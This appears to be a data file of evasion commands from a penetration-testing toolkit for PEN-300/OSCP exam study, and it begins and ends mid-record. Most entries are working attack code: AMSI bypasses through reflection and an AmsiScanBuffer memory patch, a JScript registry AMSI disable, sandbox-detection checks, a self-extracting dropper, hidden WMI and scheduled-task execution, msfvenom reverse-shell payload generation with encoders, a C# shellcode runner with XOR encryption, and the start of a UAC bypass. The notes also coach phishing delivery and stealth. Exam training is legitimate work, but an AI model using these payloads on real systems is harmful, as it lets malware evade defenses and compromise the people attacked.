}","Detect VM/sandbox by checking CPU core count. Sandboxes typically have 1-2 cores. Real systems usually have 4+. Simple environmental check.","","Syntax:
Add at start of Main() Very simple check, takes 1 line.

Not foolproof but adds friction.

Use 2 cores as threshold for broader compatibility.

Combine with API checks.

Time estimate:
30 seconds References:
docs/av-evasion/heuristic-evasion.md#environment-checks Manual alternative:
Check RAM size, disk size, screen resolution, or installed programs",""
"check-username-environment","Username/Hostname Check","heuristic-evasion","using System;

string username = Environment.UserName.ToLower();
string hostname = Environment.MachineName.ToLower();

string[] suspiciousNames = { ""sandbox"", ""malware"", ""virus"", ""analysis"", ""sample"", ""test"" };

foreach(string name in suspiciousNames) {
    if(username.Contains(name) || hostname.Contains(name)) {
        return; // Sandbox detected
    }
}","Detect sandbox by checking for common analysis usernames/hostnames (sandbox, malware, virus, analysis, etc.). Simple string matching.","","Syntax:
Add at start of Main() Low-hanging fruit.

Easy to bypass but catches lazy sandboxes.

Add common virtualization terms (vmware, vbox, qemu).

Not reliable for exam but quick to add.

Time estimate:
2 minutes References:
docs/av-evasion/heuristic-evasion.md#environment-checks Manual alternative:
Check for specific sandbox artifacts (files, registry keys, processes), or known MAC address ranges",""
"check-recent-files","Recent Files Check","heuristic-evasion","using System;
using System.IO;

string recentPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
int fileCount = Directory.GetFiles(recentPath).Length;

if(fileCount < <MIN_FILES>) {
    return; // Fresh sandbox detected
}","Detect fresh sandbox by checking if user has recent files/documents. Real systems have user activity artifacts. Fresh sandboxes typically have empty recent files.","","Syntax:
Add before payload execution Clever check that's hard to fake realistically.

Real systems accumulate artifacts over time.

5 files is safe threshold.

Good for targeted attacks where you know environment.

Time estimate:
2 minutes References:
docs/av-evasion/heuristic-evasion.md#artifact-checks Manual alternative:
Check browser history, cookie count, installed programs, or Windows event log size",""
"check-uptime","System Uptime Check","heuristic-evasion","using System;

int uptimeMS = Environment.TickCount;
int uptimeMinutes = uptimeMS / 60000;

if(uptimeMinutes < <MIN_UPTIME_MINUTES>) {
    return; // Fresh sandbox detected
}","Detect fresh sandbox by checking system uptime. Fresh analysis environments typically have very short uptime (<10 minutes). Real systems usually have hours/days uptime.","","Syntax:
Add at start of Main() Effective against automated analysis.

10 minutes is safe threshold (most analysis completes in 5 min).

Don't use values >30 min to avoid false positives on legitimate reboots.

Time estimate:
1 minute References:
docs/av-evasion/heuristic-evasion.md#uptime-checks Manual alternative:
Check last boot time via WMI, or check process start times for long-running system processes",""
"amsi-context-corruption","AMSI Context Corruption (Reflection)","amsi-bypass","[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*Context'}|%{[IntPtr]$ptr=$_.GetValue($null);[System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes(0),0,$ptr,4)}}","Overwrite AMSI context structure header via .NET Reflection to force E_INVALIDARG errors. Most reliable method on older Windows 10 builds.","","Syntax:
Paste directly into PowerShell session before executing AMSI-flagged code Test multiple bypass methods in lab before exam.

Context corruption works on most Windows 10 1809-1909 builds.

Always have backup method ready.

Time estimate:
30 seconds References:
docs/av-evasion/amsi-bypass.md#context-corruption, PEN-300 Chapter 7.3.1 Manual alternative:
Use obfuscation techniques, execute from non-AMSI context (cmd.exe -> powershell -EncodedCommand), or use alternate scripting languages (Python, compiled binaries)",""
"amsi-init-failed","AMSI Initialization Bypass","amsi-bypass","[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*InitFailed'}|%{$_.SetValue($null,$true)}}","Set amsiInitFailed flag to prevent AMSI initialization checks. Simpler than context corruption but may be detected by behavioral monitoring.","","Syntax:
Execute before AMSI-flagged operations Faster than context corruption but potentially less reliable.

Good for quick tests.

Combine with obfuscation for better results.

Time estimate:
15 seconds References:
docs/av-evasion/amsi-bypass.md#initialization-bypass, PEN-300 Chapter 7.3.2 Manual alternative:
Use PowerShell constrained language mode bypass, alternate execution contexts (runspaces), or compiled .NET assemblies",""
"amsi-memory-patch","AMSI Memory Patching (AmsiScanBuffer)","amsi-bypass","$Win32=@""
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(""kernel32"")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport(""kernel32"")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport(""kernel32"")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
""@
Add-Type $Win32
$lib=[Win32]::LoadLibrary(""amsi.dll"")
$addr=[Win32]::GetProcAddress($lib,""AmsiScanBuffer"")
$p=0
[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)
$patch=[Byte[]](0x48,0x31,0xC0,0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,4)","Patch AmsiScanBuffer function in memory to always return clean result. Most reliable method but requires more code. Patches with 'XOR RAX,RAX; RET' to force AMSI_RESULT_CLEAN.","","Syntax:
Execute complete script in PowerShell session Most reliable across Windows versions.

Works even when other methods are patched.

Takes 1-2 minutes to type if needed.

Save as .ps1 file for quick deployment.

Time estimate:
2 minutes (manual typing) or 10 seconds (pre-staged file) References:
docs/av-evasion/amsi-bypass.md#memory-patching, PEN-300 Chapter 7.4 Manual alternative:
Use DLL injection, process hollowing, or execute payloads from unmanaged memory contexts (C/C++ loaders)",""
"amsi-test-payload","AMSI Test Payload","amsi-bypass","'Invoke-Mimikatz'","Known AMSI-flagged string for testing bypass effectiveness. If this executes without error, AMSI is successfully bypassed.","","Syntax:
Execute after bypass attempt Always test bypass before executing real payload.

'Invoke-Mimikatz', 'amsiutils', 'AmsiScanBuffer' are reliable test strings.

Save time by testing early.

Time estimate:
5 seconds References:
docs/av-evasion/amsi-bypass.md#testing Manual alternative:
Use VirusTotal or local Defender scan to validate if payload is flagged",""
"amsi-base64-staging","Base64 AMSI Bypass Staging","amsi-bypass","powershell -EncodedCommand <BASE64_BYPASS>","Encode AMSI bypass in Base64 for command-line execution or evasion of string-based detections. Useful for initial access payloads.","","Syntax:
Generate Base64 encoded bypass command Useful for phishing payloads, macro delivery, or any scenario where command-line arguments are exposed.

Pre-generate and test before exam.

Time estimate:
1 minute References:
docs/av-evasion/amsi-bypass.md#obfuscation Manual alternative:
Use alternate encodings (hex, compression), or deliver via encrypted channels (SSL/TLS)",""
"amsi-jscript-registry","AMSI Bypass for JScript (Registry)","amsi-bypass","var sh = new ActiveXObject(""WScript.Shell"");
var key = ""HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"";
try {
    var val = sh.RegRead(key);
    if(val != 0) {
        sh.RegWrite(key, 0, ""REG_DWORD"");
    }
} catch(e) {
    sh.RegWrite(key, 0, ""REG_DWORD"");
}
WScript.Echo(""AMSI disabled for WSH"");","Disable AMSI for JScript/VBScript by setting AmsiEnable registry value to 0. Requires user-level registry access (HKCU).","","Syntax:
Add to .js file before malicious operations Useful for Office macro chains (VBA -> WScript -> JScript -> Payload).

Persistent across reboots until key is removed.

Clean up for stealth.

Time estimate:
30 seconds References:
docs/av-evasion/amsi-bypass.md#jscript-bypass, PEN-300 Chapter 7.6 Manual alternative:
Execute JScript from non-AMSI context, use COM objects instead of WScript, or compile to executable with JScript.NET",""
"jscript-amsi-registry-bypass","JScript AMSI Registry Bypass","jscript-evasion","var sh = new ActiveXObject(""WScript.Shell"");
var key = ""HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"";
try {
    var val = sh.RegRead(key);
    if(val != 0) {
        sh.RegWrite(key, 0, ""REG_DWORD"");
    }
} catch(e) {
    sh.RegWrite(key, 0, ""REG_DWORD"");
}
WScript.Echo(""AMSI disabled for WSH"");","Disable AMSI for JScript/VBScript by setting AmsiEnable registry value to 0. Requires user-level registry access (HKCU). Persists until key removed.","","Syntax:
Save as .js file, execute with wscript.exe or cscript.exe Useful for VBA -> JScript attack chains.

Persistent (survives reboot) - good and bad.

Remember to clean up.

See also:
amsi-jscript-registry in amsi-bypass module.

Time estimate:
2 minutes References:
docs/av-evasion/jscript-evasion.md#amsi-registry-bypass, amsi-bypass.json#amsi-jscript-registry, PEN-300 Chapter 7.6.2 Manual alternative:
Execute JScript from non-AMSI context, use COM objects, or compile to .exe with JScript.NET",""
"jscript-self-modifying-exe","JScript Self-Modifying Executable","jscript-evasion","// Part 1: JScript dropper (beginning of .js file)
var fso = new ActiveXObject(""Scripting.FileSystemObject"");
var sh = new ActiveXObject(""WScript.Shell"");

// Read own file
var scriptPath = WScript.ScriptFullName;
var file = fso.OpenTextFile(scriptPath, 1);
var content = file.ReadAll();
file.Close();

// Extract payload after marker
var marker = ""###PAYLOAD###"";
var payloadStart = content.indexOf(marker) + marker.length;
var payload = content.substring(payloadStart);

// Write payload to temp file
var tempPath = sh.ExpandEnvironmentStrings(""%TEMP%"") + ""\\<OUTPUT_FILE>"";
var outFile = fso.CreateTextFile(tempPath, true);
outFile.Write(payload);
outFile.Close();

// Execute payload
sh.Run(tempPath, 0);

// Part 2: Embedded payload (after JScript code)
WScript.Quit();
###PAYLOAD###
<EMBEDDED_PAYLOAD_CONTENT>","Concatenate JScript dropper with embedded payload into single executable. WSH script reads own file, extracts embedded payload, writes to disk and executes. Evades initial AMSI scan.","","Syntax:
Create JScript dropper, append payload after marker, save as .js Creative evasion technique.

Initial scan sees benign dropper.

Payload extracted at runtime.

Good for embedding PowerShell scripts or small executables.

Test marker uniqueness.

~20 min to implement.

Time estimate:
20 minutes References:
docs/av-evasion/jscript-evasion.md#self-modifying, PEN-300 Chapter 7.6.3 Manual alternative:
Use HTTP download instead of embedding, encrypted payload sections, or multi-stage loaders",""
"jscript-wsh-obfuscation","JScript String Obfuscation","jscript-evasion","// Method 1: String.fromCharCode()
var cmd = String.fromCharCode(112,111,119,101,114,115,104,101,108,108); // ""powershell""

// Method 2: String concatenation
var cmd = ""pow"" + ""er"" + ""shell.exe"";

// Method 3: Array join
var parts = [""pow"", ""er"", ""shell""];
var cmd = parts.join("""") + "".exe"";

// Method 4: Base64 decode (custom function)
function b64decode(str) {
    var b64 = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="";
    var decoded = """";
    // Decode implementation...
    return decoded;
}
var cmd = b64decode(""cG93ZXJzaGVsbC5leGU="");","Obfuscate suspicious strings in JScript using various encoding techniques. Evades simple string-based signatures.","","Syntax:
Apply to suspicious strings in JScript code Quick win for JScript payloads.

Always obfuscate 'powershell', 'cmd', 'http', 'eval'.

Use random variable names.

String.fromCharCode() most effective.

~10 min to apply.

Time estimate:
10 minutes References:
docs/av-evasion/jscript-evasion.md#obfuscation Manual alternative:
Use eval() with encoded strings, external config files, or hex encoding",""
"jscript-com-execution","JScript COM Object Execution","jscript-evasion","// Method 1: WMI Process Creation
var wmi = GetObject(""winmgmts:\\\\.\\root\\cimv2"");
var startup = wmi.Get(""Win32_ProcessStartup"").SpawnInstance_();
startup.ShowWindow = 0; // Hidden
var process = wmi.Get(""Win32_Process"");
var pid = {};
process.Create(""<COMMAND>"", null, startup, pid);

// Method 2: Task Scheduler
var schedule = new ActiveXObject(""Schedule.Service"");
schedule.Connect();
var rootFolder = schedule.GetFolder(""\\"");
var taskDef = schedule.NewTask(0);
var action = taskDef.Actions.Create(0); // Execute
action.Path = ""<COMMAND>"";
rootFolder.RegisterTaskDefinition(""<TASK_NAME>"", taskDef, 6, null, null, 3);","Execute commands via COM objects instead of direct Shell.Run(). Uses WMI, Task Scheduler, or other COM interfaces to break behavioral patterns.","","Syntax:
Replace <COMMAND> with payload command COM execution breaks simple parent-child monitoring.

WMI method more reliable than Task Scheduler.

Clean up tasks after execution.

Good for persistence too.

~15 min to implement.

Time estimate:
15 minutes References:
docs/av-evasion/jscript-evasion.md#com-execution Manual alternative:
Use WScript.Shell.Exec(), CreateObject(""Shell.Application"").ShellExecute(), or MMC20.Application COM object",""
"wscript-cscript-execution","WScript vs CScript Execution","jscript-evasion","# Execute with WScript (GUI mode, hidden)
wscript.exe //B //Nologo <SCRIPT_FILE>

# Execute with CScript (console mode)
cscript.exe //B //Nologo <SCRIPT_FILE>

# Force hidden execution (WScript)
wscript.exe //B //Nologo <SCRIPT_FILE>

# Within script, check execution mode:
var isConsole = (WScript.FullName.toLowerCase().indexOf(""cscript"") != -1);","Choose between WScript.exe (GUI) and CScript.exe (console) for JScript/VBScript execution. CScript better for stealth (no windows), WScript better for hidden execution.","","Syntax:
Execute from command line or within script WScript for GUI-less execution from shortcuts/scheduled tasks.

CScript for command-line integration.

Always use //B //Nologo for stealth.

Test both modes - different behavioral signatures.

Time estimate:
2 minutes References:
docs/av-evasion/jscript-evasion.md#execution-modes Manual alternative:
Use PowerShell Invoke-Expression, direct COM object instantiation, or mshta.exe for HTA execution",""
"windbg-attach-process","WinDbg Attach to Process","debugging","# Launch WinDbg (x64) and attach:
# File -> Attach to Process -> Select process -> OK

# Or via command line:
windbg.exe -p <PID>

# Common processes to debug:
# - powershell.exe (AMSI analysis)
# - cscript.exe / wscript.exe (JScript AMSI)
# - WINWORD.EXE (VBA analysis)","Attach WinDbg debugger to running process for live analysis. Essential for analyzing AMSI.DLL loading, function hooking, and runtime behavior.","","Syntax:
Launch WinDbg, attach to target process WinDbg essential for understanding AMSI internals.

Attach to PowerShell to analyze AmsiScanBuffer.

Use sparingly in OSCP (time-consuming).

Good for lab research before exam.

~5 min setup time.

Time estimate:
5 minutes (first-time setup) References:
docs/av-evasion/debugging.md#windbg-basics, PEN-300 Chapter 7.1.1 Manual alternative:
Use x64dbg, OllyDbg (32-bit), or Visual Studio debugger",""
"windbg-breakpoint-commands","WinDbg Breakpoint Commands","debugging","# Set breakpoint on function
bp <MODULE>!<FUNCTION>

# Common AMSI breakpoints:
bp amsi!AmsiInitialize
bp amsi!AmsiOpenSession
bp amsi!AmsiScanBuffer
bp amsi!AmsiCloseSession

# Continue execution
g

# Step execution
p  # Step over
t  # Step into

# List breakpoints
bl

# Clear breakpoint
bc <BREAKPOINT_NUMBER>","Set breakpoints on functions to intercept execution. Critical for analyzing AMSI function flow (AmsiInitialize, AmsiScanBuffer, etc.).","","Syntax:
Execute in WinDbg command window Breakpoints critical for AMSI research.

AmsiScanBuffer most important (called on every script scan).

Practice setting bp before exam.

Takes 1-2 min per breakpoint.

Time estimate:
2 minutes per breakpoint References:
docs/av-evasion/debugging.md#breakpoints, PEN-300 Chapter 7.1.1 Manual alternative:
Use x64dbg GUI, hardware breakpoints (ba command), or memory breakpoints",""
"windbg-memory-inspection","WinDbg Memory Inspection","debugging","# Display memory as DWORD (32-bit values)
dd <ADDRESS>

# Display memory as QWORD (64-bit values)
dq <ADDRESS>

# Display memory as ASCII string
dc <ADDRESS>

# Display memory as Unicode string
du <ADDRESS>

# Display memory as bytes
db <ADDRESS>

# Display specific number of values
dd <ADDRESS> L<COUNT>","Inspect memory contents at specific addresses. Essential for viewing AMSI context structures, shellcode buffers, and function parameters.","","Syntax:
Execute in WinDbg after breaking at function Memory inspection reveals AMSI context structure (first 4 bytes:
""AMSI"").

Critical for understanding context corruption bypass.

Use 'du' for PowerShell strings (Unicode).

~1 min per inspection.

Time estimate:
1 minute References:
docs/av-evasion/debugging.md#memory-inspection, PEN-300 Chapter 7.2 Manual alternative:
Use Process Explorer memory viewer, x64dbg memory map, or CheatEngine",""
"windbg-disassemble","WinDbg Disassembly View","debugging","# Unassemble at current instruction pointer
u

# Unassemble specific address or function
u <ADDRESS>
u <MODULE>!<FUNCTION>

# Unassemble with length
u <ADDRESS> L<COUNT>

# Unassemble current function
uf .

# Unassemble specific function (full)
uf <MODULE>!<FUNCTION>","Disassemble machine code to assembly instructions. Shows function internals, allows understanding of AMSI validation logic and bypass opportunities.","","Syntax:
Execute in WinDbg Understanding AmsiScanBuffer disassembly shows WHERE to patch for memory bypass.

Look for 'test', 'cmp', 'je' instructions (validation logic).

'xor rax, rax; ret' = clean return.

~10 min to analyze function.

Time estimate:
10 minutes (function analysis) References:
docs/av-evasion/debugging.md#disassembly, PEN-300 Chapter 7.4.1 Manual alternative:
Use IDA Pro, Ghidra, Binary Ninja, or x64dbg for static analysis",""
"frida-trace-amsi","Frida Trace AMSI Functions","debugging","# List running processes
frida-ps

# Trace AMSI functions in PowerShell process
frida-trace -p <PID> -x amsi.dll -i Amsi*

# Trace with detailed logging
frida-trace -p <PID> -x amsi.dll -i AmsiScanBuffer -i AmsiInitialize","Use Frida dynamic instrumentation to trace AMSI API calls. Non-invasive alternative to WinDbg for analyzing AMSI behavior without debugging.","","Syntax:
Execute from Kali or Windows with Frida installed Frida is powerful but may be blocked by AV/EDR.

Good for lab analysis before exam.

Shows WHAT PowerShell sends to AMSI for scanning.

Custom handlers reveal buffer contents.

~15 min setup first time.

Time estimate:
15 minutes (first-time setup) References:
docs/av-evasion/debugging.md#frida, PEN-300 Chapter 7.2.2 Manual alternative:
Use API Monitor, Process Monitor, or WinDbg for function tracing",""
"windbg-edit-memory","WinDbg Edit Memory (Live Patching)","debugging","# Edit memory (DWORD)
ed <ADDRESS> <NEW_VALUE>

# Edit memory (byte)
eb <ADDRESS> <BYTE1> <BYTE2> <BYTE3> ...

# Example: Patch AmsiScanBuffer to return clean
# Find function address:
x amsi!AmsiScanBuffer

# Patch with: xor rax,rax (48 31 C0); ret (C3)
eb <ADDRESS> 48 31 C0 C3","Modify memory at runtime to test patches. Allows live testing of AMSI bypass patches without recompiling code.","","Syntax:
Execute in WinDbg after breaking Live patching validates bypass techniques before implementing in code.

Patch AmsiScanBuffer with 'xor rax,rax; ret' to test if bypass works.

Reversible (just restart process).

~5 min to test patch.

Time estimate:
5 minutes References:
docs/av-evasion/debugging.md#live-patching, PEN-300 Chapter 7.4.2 Manual alternative:
Use x64dbg patches, Cheat Engine, or process memory writers",""
"find-av-signature","Find-AVSignature (Binary Signature Location)","signature-evasion","Import-Module .\Find-AVSignature.ps1
Find-AVSignature -StartByte 0 -EndByte max -Interval <INTERVAL> -Path <TARGET_FILE> -OutPath <OUTPUT_DIR> -Verbose -Force","PowerShell script to locate exact byte offsets flagged by antivirus. Uses binary search (split-and-scan) to narrow down signature location in executable files.","","Syntax:
Run on Windows with PowerShell, requires Find-AVSignature.ps1 script Time-consuming but precise.

Typical workflow:
10000→1000→100→10→1 byte intervals.

Takes 15-30 minutes per signature.

Practice on known-flagged payloads before exam.

Time estimate:
15-30 minutes per signature References:
docs/av-evasion/signature-evasion.md#find-av-signature, PEN-300 Chapter 6.3 Manual alternative:
Manual binary editing with hex editor (HxD, 010 Editor), or automated tools like ThreatCheck, DefenderCheck",""
"modify-signature-bytes","Modify Signature Bytes (PowerShell)","signature-evasion","$bytes = [System.IO.File]::ReadAllBytes('<INPUT_FILE>')
<MODIFICATIONS>
[System.IO.File]::WriteAllBytes('<OUTPUT_FILE>', $bytes)","Overwrite flagged byte offsets in binary file. Replace identified signature bytes with nulls or random values to break AV detection.","","Syntax:
PowerShell byte modification Only modify bytes identified by Find-AVSignature.

Don't randomly modify - will corrupt exe.

Test modified binary before deploying.

May need multiple iterations.

Time estimate:
5 minutes per modification cycle References:
docs/av-evasion/signature-evasion.md#byte-modification, PEN-300 Chapter 6.3 Manual alternative:
Use hex editor manually (HxD, 010 Editor, Hex Fiend), or automated patching tools",""
"msfvenom-encoder-shikata","msfvenom Shikata Ga Nai Encoder (x86)","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i <ITERATIONS> -f exe -o <OUTPUT_FILE>","Polymorphic XOR encoder for x86 payloads. Most well-known msfvenom encoder. Note: Heavily signatured by modern AV - use as baseline, not final solution.","","Syntax:
Run on Kali Linux Shikata is famous but outdated.

Don't rely on it alone.

Useful as first layer before custom encryption.

Know limitations for exam.

Max 15-20 iterations before diminishing returns.

Time estimate:
1 minute References:
docs/av-evasion/signature-evasion.md#shikata-ga-nai, PEN-300 Chapter 6.4.1 Manual alternative:
Use alternate encoders (zutto_dekiru, xor_dynamic), custom encryption, or obfuscation frameworks",""
"msfvenom-encoder-zutto","msfvenom Zutto Dekiru Encoder (x64)","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -e x64/zutto_dekiru -i <ITERATIONS> -f exe -o <OUTPUT_FILE>","Polymorphic encoder for x64 payloads. x64 equivalent of shikata_ga_nai. Better than no encoding but still well-known to AV vendors.","","Syntax:
Run on Kali Linux Use for x64 targets.

Same limitations as shikata.

Must combine with custom encryption or process injection for exam success.

Time estimate:
1 minute References:
docs/av-evasion/signature-evasion.md#zutto-dekiru, PEN-300 Chapter 6.4.1 Manual alternative:
Use custom loaders with AES encryption, process injection, or shellcode encryption",""
"msfvenom-encrypt-aes","msfvenom AES256 Encryption","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> --encrypt aes256 --encrypt-key <KEY> -f exe -o <OUTPUT_FILE>","AES256 encryption for msfvenom payloads. Stronger than encoding - payload encrypted with key, decrypted at runtime. Requires key management.","","Syntax:
Run on Kali Linux Better than encoding but msfvenom's built-in decryptor is signatured.

For exam, use custom C# AES decryption for best results.

AES good for understanding concepts.

Time estimate:
1 minute References:
docs/av-evasion/signature-evasion.md#aes-encryption, PEN-300 Chapter 6.4.2 Manual alternative:
Custom AES implementation in C#/Python, XOR with multi-byte keys, or RC4 encryption",""
"msfvenom-template-injection","msfvenom Template Injection","signature-evasion","msfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> -x <TEMPLATE_EXE> -f exe -o <OUTPUT_FILE>","Inject payload into legitimate Windows executable using -x flag. Payload embedded in target binary, inherits legitimate code's reputation/signature.","","Syntax:
Run on Kali Linux with template executable Template injection can improve trust but doesn't bypass modern AV signatures.

Best used with signed/legitimate binaries.

Test with and without -k flag.

Transfer legitimate Windows binaries to Kali for best templates.

Time estimate:
2 minutes References:
docs/av-evasion/signature-evasion.md#template-injection, PEN-300 Chapter 6.4 Manual alternative:
Manual PE injection with tools like CFF Explorer, PE-Bear, or custom Python scripts",""
"clamscan-test","ClamAV Signature Test","signature-evasion","cd 'C:\Program Files\ClamAV\'
.\clamscan.exe <TARGET_FILE>","Test binary against ClamAV signatures locally. Fast offline AV testing without uploading to VirusTotal. Useful for iterative testing during signature evasion.","","Syntax:
Run on Windows with ClamAV installed ClamAV is free baseline test.

Not comprehensive (misses many commercial signatures) but useful for rapid iteration.

Don't rely solely on ClamAV - test with Defender or Avira too.

Time estimate:
30 seconds per scan References:
docs/av-evasion/signature-evasion.md#testing, PEN-300 Chapter 6.2 Manual alternative:
Use online scanners (AntiScan.Me - doesn't distribute), VirusTotal (distributes to vendors), or Windows Defender locally",""
"csharp-shellcode-runner-basic","C# Shellcode Runner (Basic)","shellcode-runners","using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner {
    class Program {
        [DllImport(""kernel32"")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport(""kernel32"")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport(""kernel32"")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        
        static void Main(string[] args) {
            byte[] buf = new byte[] { <SHELLCODE> };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}","Basic C# template for executing raw shellcode via VirtualAlloc → CreateThread → WaitForSingleObject pattern.
Foundation for all custom runners.","","Syntax:
Save as Program.cs, compile with csc.exe Basic runner will be flagged by modern AV.

Always add encryption (caesar/xor) or heuristic evasion before deploying.

Practice compiling on Windows target.

Time estimate:
2 minutes (with pre-generated shellcode) References:
docs/av-evasion/shellcode-runners.md#basic-runner, PEN-300 Chapter 6.5.1 Manual alternative:
Use Python ctypes, PowerShell reflection, or compiled languages (C/C++) for shellcode execution",""
"csharp-caesar-encrypt","C# Caesar Cipher Encryption","shellcode-runners","// ENCRYPTION (offline)
byte[] buf = new byte[] { <RAW_SHELLCODE> };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)(((uint)buf[i] + <KEY>) & 0xFF);
}
// Print encoded array
Console.WriteLine(""byte[] encoded = new byte[] { "" + string.Join("","", encoded.Select(b => $""0x{b:X2}"")) + "" };"");

// DECRYPTION (runtime in runner)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)(((uint)buf[i] - <KEY>) & 0xFF);
}","Encrypt shellcode with Caesar cipher (byte rotation).
Simple obfuscation to evade static signatures.
Decrypt at runtime before execution.","","Syntax:
Add encryption offline, add decryption to runner before VirtualAlloc Caesar cipher is weak but fast.

Good for lab practice.

For exam, use XOR or combine with heuristic evasion.

Key=2 is common in examples.

Time estimate:
5 minutes (encryption + integration) References:
docs/av-evasion/shellcode-runners.md#caesar-cipher, PEN-300 Chapter 6.5.2 Manual alternative:
Use XOR encryption (stronger), AES encryption (strongest), or custom encoding schemes",""
"csharp-xor-encrypt","C# XOR Encryption","shellcode-runners","// ENCRYPTION (offline)
byte[] buf = new byte[] { <RAW_SHELLCODE> };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)((uint)buf[i] ^ <XOR_KEY>);
}

// DECRYPTION (runtime - same operation)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)((uint)buf[i] ^ <XOR_KEY>);
}","XOR encryption for shellcode.
Stronger than Caesar cipher.
Each byte XORed with key, decrypt by XORing again (XOR is reversible).","","Syntax:
XOR encrypt offline, XOR decrypt at runtime (same key) XOR is standard industry practice.

Key 0xAA common but predictable - use random key.

Combine with heuristic evasion for best results.

Time estimate:
5 minutes References:
docs/av-evasion/shellcode-runners.md#xor-encryption Manual alternative:
Use multi-byte XOR keys, AES encryption, or RC4 cipher for stronger protection",""
"csharp-sleep-timer","C# Sleep Timer Evasion","shellcode-runners","using System;
using System.Threading;

DateTime t1 = DateTime.Now;
Thread.Sleep(<SLEEP_MS>);
double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
if(deltaT < <THRESHOLD_SEC>) {
    return; // Sandbox detected - exit
}
// Continue with payload execution","Heuristic evasion using sleep timer with elapsed time validation.
Sandboxes skip Sleep() calls - detect by measuring actual elapsed time.","","Syntax:
Add before shellcode execution in Main() Simple but effective against basic sandboxes.

10 seconds is standard.

For exam, may skip to save time if target already compromised.

Good for phishing scenarios.

Time estimate:
1 minute (add to existing runner) References:
docs/av-evasion/shellcode-runners.md#sleep-timer, PEN-300 Chapter 6.6.1 Manual alternative:
Use non-emulated API checks (VirtualAllocExNuma), large memory allocations, or anti-debugging techniques",""
"csharp-non-emulated-api","C# Non-Emulated API Check","shellcode-runners","using System;
using System.Runtime.InteropServices;

[DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport(""kernel32.dll"")]
static extern IntPtr GetCurrentProcess();

// Sandbox check
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == null) {
    return; // Sandbox detected - API not emulated
}
// Continue with payload","Detect sandbox by calling VirtualAllocExNuma - rarely emulated API.
If NULL returned, sandbox detected.
Combines with GetCurrentProcess for legitimacy.","","Syntax:
Add before shellcode execution in Main() More sophisticated than sleep timer.

Bypasses sandboxes that wait out delays.

Combine both for maximum evasion.

Quick to add (<10 lines).

Time estimate:
2 minutes References:
docs/av-evasion/shellcode-runners.md#non-emulated-api, PEN-300 Chapter 6.6.2 Manual alternative:
Use FlsAlloc, GetTickCount64, or other rarely-emulated APIs.

Check for debugger with IsDebuggerPresent.",""
"msfvenom-csharp-payload","Generate msfvenom C# Shellcode","shellcode-runners","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f csharp","Generate shellcode in C# byte array format for use in custom runners.
Use HTTPS payloads for encrypted C2 communication.","","Syntax:
Run on Kali, copy output to C# runner Always use HTTPS payloads (not HTTP) for better evasion.

Port 443 blends with legitimate traffic.

Generate before exam, don't waste time during.

Time estimate:
30 seconds References:
docs/av-evasion/shellcode-runners.md#msfvenom-generation, PEN-300 Chapter 6.4 Manual alternative:
Use custom reverse shell (bash, python, netcat) or C2 frameworks (Cobalt Strike, Sliver, Havoc)",""
"compile-csharp-runner","Compile C# Shellcode Runner","shellcode-runners","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:<OUTPUT_EXE> <SOURCE_CS>","Compile C# source code to Windows executable using csc.exe (.NET Framework compiler).
Must be run on Windows target or staging system.","","Syntax:
Run on Windows system with .NET Framework Practice compiling on Windows VM before exam.

Framework64 for modern systems.

/target:winexe hides console window (stealthier).

Compilation is fast (<5 seconds).

Time estimate:
30 seconds References:
docs/av-evasion/shellcode-runners.md#compilation Manual alternative:
Use Visual Studio, MSBuild, or cross-compile with Mono on Linux",""
"fodhelper-uac-bypass","FodHelper UAC Bypass","uac-bypass","# Create registry structure
New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
